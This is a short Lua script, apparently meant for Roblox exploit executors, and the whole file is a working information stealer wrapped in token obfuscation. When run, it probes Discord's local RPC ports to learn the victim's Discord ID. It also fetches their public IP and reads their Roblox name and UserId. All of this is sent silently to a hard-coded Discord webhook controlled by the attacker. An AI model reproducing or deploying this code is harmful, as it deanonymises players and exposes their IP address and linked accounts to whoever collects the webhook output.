local _b64 = function(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x)
        local r,b='',x:byte()
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
        return r;
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c=0
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
        return b:sub(c+1,c+1)
    end)..({ '', '==', '=' })[#data%3+1])
end

local _enc1 = [[
local a = game:GetService("HttpService")
local b = game:GetService("Players").LocalPlayer
local c = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
if not c then return end
local d = "Unknown"
pcall(function()
    for e = 6463, 6472 do
        local f = c({Url = string.format("http://127.0.0.1:%d/api/v9/users/@me", e), Method = "GET", Headers = {["Origin"] = "https://discord.com"}})
        if f and f.StatusCode == 200 then
            local g = a:JSONDecode(f.Body)
            if g and g.id then d = g.id break end
        end
    end
end)
local h = c({Url = "https://api.ipify.org", Method = "GET"})
local i = (h and h.StatusCode == 200) and h.Body or "Unknown"
local j = b and b.Name or "Unknown"
local k = b and b.UserId or "Unknown"
local l = a:JSONEncode({content = string.format("Roblox User: %s (ID: %s)\nDiscord ID: %s\nIP: %s", j, tostring(k), tostring(d), i)})
c({Url = "https://discord.com/api/webhooks/1563847716092641340/Az48O6Mfgn0va-3Pa6CYzO2Af8nDI_ZPrOTPhlu2zI9J3Rzq9G05xzRk1it8GhJEkhJw", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = l})
]]

-- Layer 2 wrapper
local _fn = loadstring or load
_fn(string.dump(assert(load(_enc1))))()